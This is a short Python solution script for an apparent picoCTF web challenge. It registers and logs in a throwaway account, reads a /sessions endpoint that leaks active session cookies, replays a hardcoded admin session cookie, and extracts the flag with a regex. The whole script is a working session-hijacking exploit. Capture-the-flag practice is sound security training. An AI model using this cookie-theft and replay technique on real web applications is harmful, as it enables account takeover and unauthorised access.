#!/usr/bin/env python3
import requests

BASE = "http://dolphin-cove.picoctf.net:49251"

# Step 1: Register a user, login, and discover /sessions
s = requests.Session()
s.post(f"{BASE}/register", data={"username": "pwner999", "password": "x", "conf_password": "x"})
s.post(f"{BASE}/login", data={"username": "pwner999", "password": "x"})

# Step 2: /sessions leaks all active session cookies
r = s.get(f"{BASE}/sessions")
print(r.text)

# Step 3: Admin session has key='admin' — steal it and use it
r2 = requests.get(f"{BASE}/", cookies={"session": "f2er9EMXnKfi55eBtL7Y2zlhixqhSA8QAdpGLI2MQWk"})
print(r2.text)

# Extract flag
import re
m = re.search(r'picoCTF\{[^}]+\}', r2.text)
print(f"\nFlag: {m.group()}" if m else "No flag found")
